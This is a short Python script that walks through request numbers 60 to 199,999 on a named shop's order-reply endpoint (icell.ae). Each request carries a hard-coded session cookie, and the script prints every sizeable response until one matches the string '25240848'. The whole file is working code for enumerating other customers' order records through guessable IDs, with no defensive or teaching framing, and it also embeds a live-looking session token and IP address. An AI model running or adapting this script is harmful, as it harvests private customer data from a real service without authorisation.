# Install the Python Requests library:
# `pip install requests`

import requests

def send_request():
    # Request
    # GET http://icell.ae/samsung_new/order/GetReply
    
    for i in range(60, 200000):
        try:
            response = requests.get(
                url="http://icell.ae/samsung_new/order/GetReply",
                params={
                    "reqnumber": int(i),
                },
                headers={
                    "Cookie": "ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22c63545f1de7ba203b25054382c9a24ea%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%22103.42.217.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A50%3A%22Paw%2F3.1.5+%28Macintosh%3B+OS+X%2F10.13.4%29+GCDHTTPRequest%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1526036560%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Db07ef94501cdb4327d0019aeef73ba60f2d01dab",
                },
            )
            
            #print('Response HTTP Status Code: {status_code}'.format(
            #    status_code=response.status_code))
            if( len(response.content) >= 53 ):
                print('Reqnumber : ' + str(i))
                print(response.content)
                if(str(response.content).startswith('25240848') or str(response.content).endswith('25240848')):
                    
                    print('FOUND IT')
                    break
                    
                
            #print('Response HTTP Response Body: {content} {length}Bytes'.format(
            #    content=str(response.content), length=len(response.content)))
            
        except requests.exceptions.RequestException:
            print('HTTP Request failed')
            break


def main():
    send_request()

if __name__ == "__main__":
    main()